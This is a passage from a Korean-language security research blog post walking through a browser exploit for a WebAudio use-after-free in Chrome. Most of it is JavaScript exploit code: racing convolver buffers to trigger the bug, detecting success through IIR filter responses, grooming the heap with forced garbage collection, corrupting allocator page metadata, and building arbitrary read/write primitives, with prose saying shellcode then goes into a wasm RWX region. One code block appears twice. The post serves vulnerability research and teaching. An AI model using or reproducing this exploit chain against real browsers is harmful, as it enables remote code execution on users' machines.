	<span class="kd">let</span> <span class="nx">bufferSource</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createBufferSource</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">convolver</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createConvolver</span><span class="p">();</span>
 
	<span class="kd">let</span> <span class="nx">bigAudioBuffer</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createBuffer</span><span class="p">(</span><span class="nx">numChannels</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">48000</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">smallAudioBuffer</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createBuffer</span><span class="p">(</span><span class="nx">numChannels</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mi">48000</span><span class="p">);</span>
 
	<span class="nx">smallAudioBuffer</span><span class="p">.</span><span class="nx">getChannelData</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">numChannels</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="kd">let</span> <span class="nx">channelDataArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">bigAudioBuffer</span><span class="p">.</span><span class="nx">getChannelData</span><span class="p">(</span><span class="nx">i</span><span class="p">).</span><span class="nx">buffer</span><span class="p">);</span>
    		<span class="nx">channelDataArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">;</span>
	<span class="p">}</span>
 
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="nx">bigAudioBuffer</span><span class="p">;</span>
	<span class="nx">convolver</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="nx">smallAudioBuffer</span><span class="p">;</span>
 
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">loop</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">loopStart</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">loopEnd</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
 
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">convolver</span><span class="p">);</span>
	<span class="nx">convolver</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">audioCtx</span><span class="p">.</span><span class="nx">destination</span><span class="p">);</span>
 
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span>
 
	<span class="kd">let</span> <span class="nx">finished</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
 
     	<span class="nx">audioCtx</span><span class="p">.</span><span class="nx">startRendering</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
     		<span class="nx">buffer</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
 
    		<span class="k">if</span> <span class="p">(</span><span class="nx">finished</span><span class="p">)</span> <span class="p">{</span>
        		<span class="nx">audioCtx</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
 
        		<span class="nx">setTimeout</span><span class="p">(</span><span class="nx">doneCb</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span>
        		<span class="k">return</span><span class="p">;</span>
    		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        		<span class="nx">finished</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 
        		<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
             		<span class="nx">triggerSecondUAF</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">doneCb</span><span class="p">);</span>
        		<span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
    		<span class="p">}</span>
	<span class="p">});</span>
 
	<span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">finished</span><span class="p">)</span> <span class="p">{</span>
    		<span class="nx">counter</span><span class="o">++</span><span class="p">;</span>
 
    		<span class="nx">convolver</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
 
    		<span class="k">await</span> <span class="nx">later</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// wait 1 millisecond</span>
 
    		<span class="k">if</span> <span class="p">(</span><span class="nx">finished</span><span class="p">)</span>
         		<span class="k">break</span><span class="p">;</span>
 
    		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">iirFilters</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        		<span class="nx">floatArray</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
          	   <span class="nx">iirFilters</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">getFrequencyResponse</span><span class="p">(</span><span class="nx">floatArray</span><span class="p">,</span> <span class="nx">floatArray</span><span class="p">,</span> <span class="nx">floatArray</span><span class="p">);</span>
 
         		<span class="k">if</span> <span class="p">(</span><span class="nx">floatArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mf">3.1415927410125732</span><span class="p">)</span> <span class="p">{</span>
             			<span class="nx">finished</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 
             	     		<span class="nx">audioBufferArray2</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createBuffer</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">));</span>
                 		<span class="nx">audioBufferArray2</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createBuffer</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">));</span>
 
            			<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
            			<span class="nx">convolver</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
 
            			<span class="k">return</span><span class="p">;</span>
        		<span class="p">}</span>
    		<span class="p">}</span>
 
    		<span class="nx">convolver</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="nx">smallAudioBuffer</span><span class="p">;</span>
 
    		<span class="k">await</span> <span class="nx">later</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// wait 1 millisecond</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>이렇게 leak이 성공했으면 exploit을 하기 위해 한번더 취약점을 트리거합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">void</span> <span class="nx">IIRDSPKernel</span><span class="p">::</span><span class="nx">GetFrequencyResponse</span><span class="p">(</span><span class="nx">int</span> <span class="nx">n_frequencies</span><span class="p">,</span>
                                    	<span class="kd">const</span> <span class="nx">float</span><span class="o">*</span> <span class="nx">frequency_hz</span><span class="p">,</span>
                                    	<span class="nx">float</span><span class="o">*</span> <span class="nx">mag_response</span><span class="p">,</span>
                                    	<span class="nx">float</span><span class="o">*</span> <span class="nx">phase_response</span><span class="p">)</span> <span class="p">{</span>
<span class="p">...</span>
  <span class="nx">Vector</span><span class="o">&lt;</span><span class="nx">float</span><span class="o">&gt;</span> <span class="nx">frequency</span><span class="p">(</span><span class="nx">n_frequencies</span><span class="p">);</span>
  <span class="nx">double</span> <span class="nx">nyquist</span> <span class="o">=</span> <span class="k">this</span><span class="o">-&gt;</span><span class="nx">Nyquist</span><span class="p">();</span>
  <span class="c1">// Convert from frequency in Hz to normalized frequency (0 -&gt; 1),</span>
  <span class="c1">// with 1 equal to the Nyquist frequency.</span>
  <span class="k">for</span> <span class="p">(</span><span class="nx">int</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">k</span> <span class="o">&lt;</span> <span class="nx">n_frequencies</span><span class="p">;</span> <span class="o">++</span><span class="nx">k</span><span class="p">)</span>
	<span class="nx">frequency</span><span class="p">[</span><span class="nx">k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">frequency_hz</span><span class="p">[</span><span class="nx">k</span><span class="p">]</span> <span class="o">/</span> <span class="nx">nyquist</span><span class="p">;</span>
<span class="p">...</span>
</code></pre></div></div>

<p>이 과정에서 취약점 트리거가 성공했는지 확인하기 위해 getFrequencyResponse 함수를 사용합니다. 이 함수는 Nyquist 필터로 채워진 frequencies 배열을 생성하고 연산에 사용되는 배열은 0으로 초기화됩니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">finalUAFCallback</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="nx">floatArray</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
         	<span class="nx">iirFilters</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">getFrequencyResponse</span><span class="p">(</span><span class="nx">floatArray</span><span class="p">,</span> <span class="nx">floatArray</span><span class="p">,</span> <span class="nx">floatArray</span><span class="p">);</span>
 
    		<span class="k">if</span> <span class="p">(</span><span class="nx">floatArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mf">3.1415927410125732</span><span class="p">)</span> <span class="p">{</span>
        		<span class="k">await</span> <span class="nx">collectGargabe</span><span class="p">();</span>
 
        		<span class="nx">audioBufferArray2</span> <span class="o">=</span> <span class="p">[];</span>
 
        		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="mi">80</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span>
                 		<span class="nx">audioBufferArray1</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">sharedAudioCtx</span><span class="p">.</span><span class="nx">createBuffer</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">10000</span><span class="p">));</span>
 
        		<span class="nx">iirFilters</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    	     		<span class="k">await</span> <span class="nx">collectGargabe</span><span class="p">();</span>
 
        		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="mi">336</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span>
            			<span class="nx">imageDataArray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">ImageData</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
        		<span class="nx">imageDataArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
        		<span class="k">await</span> <span class="nx">collectGargabe</span><span class="p">();</span>
 
        		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">audioBufferArray1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            			<span class="kd">let</span> <span class="nx">auxArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">audioBufferArray1</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">getChannelData</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">buffer</span><span class="p">);</span>
            			<span class="k">if</span> <span class="p">(</span><span class="nx">auxArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
                			<span class="nx">kickPayload</span><span class="p">(</span><span class="nx">auxArray</span><span class="p">);</span>
                			<span class="k">return</span><span class="p">;</span>
            			<span class="p">}</span>
             		<span class="p">}</span>
 
        		<span class="k">return</span><span class="p">;</span>
    		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>따라서 결과에 π 이외의 값이 포함되면 exploit이 성공한 것이라 판단합니다. 이 경우에 재귀를 멈추고 finalUAFCallback 함수를 호출하여 오디오 채널 버퍼를 재할당합니다. 그리고 이전에 free된 메모리들을 회수합니다. 또한 다양한 객체를 할당하고 defragmentation를 수행하여 힙을 복구합니다. 이후 BigUint64Array를 이용해 arbitrary read/write 프리미티브를 얻습니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">finalUAFCallback</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="nx">floatArray</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
         	<span class="nx">iirFilters</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">getFrequencyResponse</span><span class="p">(</span><span class="nx">floatArray</span><span class="p">,</span> <span class="nx">floatArray</span><span class="p">,</span> <span class="nx">floatArray</span><span class="p">);</span>
 
    		<span class="k">if</span> <span class="p">(</span><span class="nx">floatArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mf">3.1415927410125732</span><span class="p">)</span> <span class="p">{</span>
        		<span class="k">await</span> <span class="nx">collectGargabe</span><span class="p">();</span>
 
        		<span class="nx">audioBufferArray2</span> <span class="o">=</span> <span class="p">[];</span>
 
        		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="mi">80</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span>
                 		<span class="nx">audioBufferArray1</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">sharedAudioCtx</span><span class="p">.</span><span class="nx">createBuffer</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">10000</span><span class="p">));</span>
 
        		<span class="nx">iirFilters</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    	     		<span class="k">await</span> <span class="nx">collectGargabe</span><span class="p">();</span>
 
        		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="mi">336</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span>
            			<span class="nx">imageDataArray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">ImageData</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
        		<span class="nx">imageDataArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
        		<span class="k">await</span> <span class="nx">collectGargabe</span><span class="p">();</span>
 
        		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">audioBufferArray1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            			<span class="kd">let</span> <span class="nx">auxArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">audioBufferArray1</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">getChannelData</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">buffer</span><span class="p">);</span>
            			<span class="k">if</span> <span class="p">(</span><span class="nx">auxArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
                			<span class="nx">kickPayload</span><span class="p">(</span><span class="nx">auxArray</span><span class="p">);</span>
                			<span class="k">return</span><span class="p">;</span>
            			<span class="p">}</span>
             		<span class="p">}</span>
 
        		<span class="k">return</span><span class="p">;</span>
    		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>heap defragmentation은 GC를 강제로 호출해서 발생시킵니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">kickPayload</span><span class="p">(</span><span class="nx">auxArray</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">audioCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OfflineAudioContext</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">partitionPagePtr</span> <span class="o">=</span> <span class="nx">getPartitionPageMetadataArea</span><span class="p">(</span><span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">auxArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
	<span class="nx">auxArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">partitionPagePtr</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">do</span> <span class="p">{</span>
    		<span class="nx">gcPreventer</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
    		<span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="nx">i</span> <span class="o">&gt;</span> <span class="mh">0x100000</span><span class="p">)</span>
        		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nx">auxArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
	<span class="kd">let</span> <span class="nx">freelist</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
	<span class="nx">gcPreventer</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">freelist</span><span class="p">);</span>
	<span class="p">...</span>
</code></pre></div></div>

<p>그리고 이전에 free된 AudioArray 데이터의 raw pointer 주소를 포함하는 이전에 생성된 BigUint64Array를 전달하는 kickPayload 함수를 실행합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">rwHelper</span><span class="p">,</span> <span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">rwHelper</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">;</span>
	<span class="nx">tmp</span><span class="p">.</span><span class="nx">buffer</span><span class="p">;</span>
	<span class="nx">gcPreventer</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>
	<span class="k">return</span> <span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">rwHelper</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="p">}</span>
 
<span class="kd">function</span> <span class="nx">write64</span><span class="p">(</span><span class="nx">rwHelper</span><span class="p">,</span> <span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">rwHelper</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="nx">tmp</span><span class="p">.</span><span class="nx">buffer</span><span class="p">;</span>
	<span class="nx">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
	<span class="nx">gcPreventer</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>이후 free된 객체의 PartitionPage 메타 데이터를 조작하여 exploit을 수행합니다. 다른 오브젝트의 주소를  BigUint64Array에 기록하고 새 8 바이트 객체를 만든 뒤 인덱스 0에있는 값을 다시 읽으면 이전에 설정된 주소에서 값을 읽습니다. 이 단계에서 인덱스 0에 무언가가 기록되면이 값은 이전에 설정된 주소에 대신 기록됩니다. 그렇게 해서 arbitrary read/write를 만들고 wasm 코드를 이용해 rwx 영역에 원하는 쉘코드를 적고 exploit할 수 있습니다.</p>

   </div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
   <a href="/2020-09-01/2020-BoB-CTF-Write-up-2" class="left arrow">&#8592;</a>
  
  
   <a href="/2020-07-01/Vulnerabilities-of-Flask" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2020-09-02 13:31:22 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
